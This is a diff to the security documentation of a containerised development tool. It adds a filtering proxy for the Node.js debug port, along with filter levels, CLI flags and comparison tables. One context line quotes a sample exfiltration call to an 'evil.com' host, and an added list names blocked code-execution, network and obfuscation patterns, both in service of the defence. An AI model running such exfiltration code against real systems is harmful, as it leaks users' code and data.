@@ -305,15 +305,23 @@ Container isolation depends on kernel features (namespaces, seccomp, cgroups). H
 
 ### 3. Information Disclosure via Debug Port
 
-| Threat | Default Mode | Paranoid Mode |
-|--------|--------------|---------------|
-| Debug port RCE | Mitigated (localhost only) | **Eliminated** (disabled) |
+| Threat | Default Mode | With Debug Proxy | Paranoid Mode |
+|--------|--------------|------------------|---------------|
+| Debug port RCE | Mitigated (localhost only) | **Mitigated** (filtered) | **Mitigated** (strict filter) |
+| Arbitrary code eval | **RISK** | Filtered/rate-limited | Blocked |
+| Command injection | **RISK** | Pattern-blocked | Blocked |
 
 **Default mode residual risk:** The Node.js debug protocol (port 9229) allows arbitrary code execution without authentication. Any process running as the same user on the host can connect to `127.0.0.1:9229` and execute code inside the container.
 
-**Paranoid mode:** Debug port is completely disabled.
+**Debug proxy mode (`--debug-proxy`):** Traffic is routed through a filtering proxy that:
+- Blocks dangerous CDP methods (compileScript, setScriptSource)
+- Filters dangerous patterns in evaluate commands (child_process, eval, etc.)
+- Rate-limits code execution requests
+- Logs all debug activity for audit
 
-**Manual mitigation:** Use `--no-debug-port` flag.
+**Paranoid mode (`--paranoid`):** Uses debug proxy with strict filtering - blocks ALL evaluate/execute operations. Only allows inspection (breakpoints, step, view variables).
+
+**Manual mitigation:** Use `--no-debug-port` flag to disable entirely.
 
 ### 4. SSH Server Attack Surface
 
@@ -426,16 +434,115 @@ https.get(`https://evil.com/steal?data=${Buffer.from(code).toString('base64')}`)
 
 ---
 
+---
+
+## Debug Proxy
+
+The debug proxy is a security middleman that intercepts Chrome DevTools Protocol (CDP) traffic between VS Code and the container. It provides defense-in-depth against malicious code that attempts to exploit the debug interface.
+
+### Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│ HOST                                                                │
+│                                                                     │
+│  VS Code ──► 127.0.0.1:9229 ──┐                                    │
+│                               │                                     │
+│  ┌────────────────────────────▼────────────────────────────────┐   │
+│  │ DEBUG PROXY CONTAINER                                       │   │
+│  │                                                             │   │
+│  │  ┌─────────────┐   ┌─────────────┐   ┌─────────────────┐   │   │
+│  │  │ WebSocket   │──►│   Filter    │──►│  Audit Logger   │   │   │
+│  │  │ Proxy       │   │   Engine    │   │                 │   │   │
+│  │  └─────────────┘   └─────────────┘   └─────────────────┘   │   │
+│  │         │                                                   │   │
+│  │         │ Internal network only                             │   │
+│  │         ▼                                                   │   │
+│  └─────────┬───────────────────────────────────────────────────┘   │
+│            │                                                        │
+│  ┌─────────▼───────────────────────────────────────────────────┐   │
+│  │ DEV CONTAINER                                               │   │
+│  │                                                             │   │
+│  │  Debug port 9229 ◄── only reachable from proxy              │   │
+│  │                                                             │   │
+│  └─────────────────────────────────────────────────────────────┘   │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### Filter Levels
+
+| Level | `Runtime.evaluate` | Dangerous Patterns | Use Case |
+|-------|--------------------|--------------------|----------|
+| `strict` | **Blocked** | N/A | Untrusted code |
+| `filtered` | Rate-limited, filtered | Blocked | Default with proxy |
+| `audit` | Allowed (logged) | Allowed (logged) | Trusted code, monitoring |
+| `passthrough` | Allowed | Allowed | Debugging proxy issues |
+
+### Blocked Patterns (filtered mode)
+
+The proxy blocks expressions containing:
+
+**Code Execution:**
+- `child_process`, `exec`, `spawn`, `fork`
+- `eval()`, `Function()`, `vm.runIn*`
+
+**File System Writes:**
+- `fs.writeFile`, `fs.unlink`, `fs.rm`
+
+**Network Operations:**
+- `require('http')`, `require('net')`
+- `fetch()`, `XMLHttpRequest`, `WebSocket`
+
+**Obfuscation:**
+- Hex escape sequences (`\x41`)
+- Base64 decode (`atob`, `Buffer.from(..., 'base64')`)
+
+### Usage
+
+```bash
+# Build the proxy image (one-time)
+devkit build --proxy
+
+# Start with proxy filtering
+devkit start --debug-proxy
+
+# Start with strict filtering (blocks all evaluate)
+devkit start --debug-proxy --proxy-filter=strict
+
+# Paranoid mode includes strict proxy automatically
+devkit start --paranoid
+
+# View proxy audit logs
+podman logs devkit-myproject-debugproxy
+
+# View proxy statistics
+curl http://localhost:9229/stats
+```
+
+### Audit Logging
+
+All CDP messages are logged in JSON format:
+
+```json
+{"timestamp":"2024-01-15T10:30:00Z","type":"request","method":"Runtime.evaluate","expression":"process.env"}
+{"timestamp":"2024-01-15T10:30:01Z","type":"blocked","method":"Runtime.evaluate","reason":"child_process reference blocked"}
+```
+
+---
+
 ## Security Configuration Reference
 
 ### CLI Flags
 
-| Flag | Description | Network | Debug Port |
-|------|-------------|---------|------------|
-| (none) | Default secure mode | Restricted | Enabled |
-| `--paranoid` | Maximum security, air-gap after setup | None (after setup) | Disabled |
-| `--offline` | Start with no network immediately | None | Enabled |
-| `--no-debug-port` | Disable debug port only | Restricted | Disabled |
+| Flag | Description | Network | Debug |
+|------|-------------|---------|-------|
+| (none) | Default secure mode | Restricted | Direct (localhost) |
+| `--debug-proxy` | Route debug through filtering proxy | Restricted | Proxied (filtered) |
+| `--paranoid` | Maximum security, air-gap + strict proxy | None (after setup) | Proxied (strict) |
+| `--offline` | Start with no network immediately | None | Direct (localhost) |
+| `--no-debug-port` | Disable debug port entirely | Restricted | Disabled |
+| `--proxy-filter=LEVEL` | Set proxy filter level | - | strict/filtered/audit |
 
 ### Configuration File
 
@@ -483,16 +590,17 @@ features:
 
 ## Comparison with Alternatives
 
-| Feature | Devkit (default) | Devkit (paranoid) | Docker (default) | VM |
-|---------|------------------|-------------------|------------------|-----|
-| Host filesystem isolation | ✅ Full | ✅ Full | ❌ Often mounted | ✅ Full |
-| Localhost network isolation | ✅ Blocked | ✅ Blocked | ❌ Accessible | ✅ Separate |
-| Outbound network isolation | ❌ Allowed | ✅ Blocked | ❌ Allowed | Configurable |
-| Privilege escalation prevention | ✅ Hardened | ✅ Hardened | ❌ Default caps | ✅ Separate kernel |
-| Debug port exposure | ⚠️ Localhost | ✅ Disabled | ⚠️ Varies | N/A |
-| Kernel-level isolation | ⚠️ Shared | ⚠️ Shared | ⚠️ Shared | ✅ Separate |
-| Performance | ✅ Native | ✅ Native | ✅ Native | ⚠️ Overhead |
-| Setup complexity | ✅ Simple | ✅ Simple | ⚠️ Manual hardening | ⚠️ Complex |
+| Feature | Devkit (default) | Devkit (proxy) | Devkit (paranoid) | Docker (default) | VM |
+|---------|------------------|----------------|-------------------|------------------|-----|
+| Host filesystem isolation | ✅ Full | ✅ Full | ✅ Full | ❌ Often mounted | ✅ Full |
+| Localhost network isolation | ✅ Blocked | ✅ Blocked | ✅ Blocked | ❌ Accessible | ✅ Separate |
+| Outbound network isolation | ❌ Allowed | ❌ Allowed | ✅ Blocked | ❌ Allowed | Configurable |
+| Privilege escalation prevention | ✅ Hardened | ✅ Hardened | ✅ Hardened | ❌ Default caps | ✅ Separate |
+| Debug port security | ⚠️ Localhost | ✅ Filtered | ✅ Strict filter | ⚠️ Varies | N/A |
+| Debug audit logging | ❌ None | ✅ Full | ✅ Full | ❌ None | N/A |
+| Kernel-level isolation | ⚠️ Shared | ⚠️ Shared | ⚠️ Shared | ⚠️ Shared | ✅ Separate |
+| Performance | ✅ Native | ✅ Native | ✅ Native | ✅ Native | ⚠️ Overhead |
+| Setup complexity | ✅ Simple | ✅ Simple | ✅ Simple | ⚠️ Manual hardening | ⚠️ Complex |
 
 ---
 
